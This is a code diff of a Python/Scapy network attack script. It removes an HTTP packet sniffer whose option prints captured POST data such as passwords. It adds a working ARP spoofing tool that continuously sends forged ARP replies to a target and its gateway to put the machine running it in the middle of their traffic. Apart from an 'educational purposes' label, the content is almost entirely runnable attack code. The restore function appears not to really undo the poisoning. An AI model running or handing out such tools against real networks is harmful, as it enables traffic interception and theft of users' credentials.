@@ -1,55 +1,67 @@
-from scapy.all import sniff, IP, Raw
-from scapy.layers.http import HTTPRequest
-from colorama import init, Fore
+import argparse
+import time
+from scapy.all import ARP, Ether, send, srp
 
-# Initialize colorama
-init()
+# Function to perform ARP spoofing
+def arp_spoof(target_ip, gateway_ip, interface):
+    # Crafting the ARP response packet to trick the target into thinking
+    # this machine's MAC is the gateway's MAC address.
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
 
-# Define colors
-GREEN = Fore.GREEN
-RED   = Fore.RED
-RESET = Fore.RESET
+    print(f"[*] Target MAC: {target_mac}")
+    print(f"[*] Gateway MAC: {gateway_mac}")
 
-def sniff_packets(iface=None, show_raw=False):
-    """
-    Sniff port 80 packets with `iface`. If None (default), the
-    Scapy's default interface is used.
-    """
-    if iface:
-        # Sniff HTTP packets (port 80)
-        sniff(filter="port 80", prn=lambda packet: process_packet(packet, show_raw), iface=iface, store=False)
+    # Infinite loop to send ARP responses
+    while True:
+        # Send fake ARP reply (target thinks our MAC is the gateway)
+        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac), iface=interface, verbose=False)
+        # Send another fake ARP reply to the gateway (gateway thinks our MAC is the target)
+        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac), iface=interface, verbose=False)
+        print(f"[*] Sent ARP spoof to target {target_ip} and gateway {gateway_ip}")
+        time.sleep(2)
+
+# Function to get MAC address from an IP address
+def get_mac(ip):
+    # Send ARP request to get the MAC address for the IP
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    
+    # Return the MAC address
+    if answered_list:
+        return answered_list[0][1].hwsrc
     else:
-        # Sniff with the default interface
-        sniff(filter="port 80", prn=lambda packet: process_packet(packet, show_raw), store=False)
+        print(f"[!] Failed to get MAC address for {ip}")
+        return None
 
-def process_packet(packet, show_raw):
-    """
-    This function is executed whenever a packet is sniffed.
-    """
-    if packet.haslayer(HTTPRequest):
-        # If this packet is an HTTP Request
-        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
-        ip = packet[IP].src  # Get the requester's IP address
-        method = packet[HTTPRequest].Method.decode()  # Get the request method
-        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
+# Function to restore the network to its original state
+def restore_network(target_ip, gateway_ip, target_mac, gateway_mac, interface):
+    print("[*] Restoring network...")
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac), iface=interface, count=5, verbose=False)
+    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac), iface=interface, count=5, verbose=False)
+    print("[*] Network restored.")
 
-        if show_raw and packet.haslayer(Raw) and method == "POST":
-            # If show_raw flag is enabled, has raw data, and the method is "POST"
-            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
+# Main function to parse arguments and run ARP spoofing
+def main():
+    parser = argparse.ArgumentParser(description="ARP Spoofing Tool for Educational Purposes")
+    parser.add_argument("-t", "--target", required=True, help="Target IP Address")
+    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP Address")
+    parser.add_argument("interface", help="Network Interface (e.g., eth0, wlan0)")
+    args = parser.parse_args()
+
+    target_ip = args.target
+    gateway_ip = args.gateway
+    interface = args.interface
+
+    print(f"[*] Starting ARP Spoofing on interface {interface}")
+    try:
+        arp_spoof(target_ip, gateway_ip, interface)
+    except KeyboardInterrupt:
+        print("\n[!] Stopping ARP spoofing...")
+        restore_network(target_ip, gateway_ip, get_mac(target_ip), get_mac(gateway_ip), interface)
+        print("[*] Exiting the program...")
 
 if __name__ == "__main__":
-    import argparse
-
-    # Set up argument parser
-    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, useful when you're a man in the middle." \
-                                                 " It is suggested that you run arp spoof before using this script, otherwise it'll sniff your personal packets.")
-    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
-    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
-    
-    # Parse arguments
-    args = parser.parse_args()
-    iface = args.iface
-    show_raw = args.show_raw
-    
-    # Start sniffing
-    sniff_packets(iface, show_raw)
+    main()
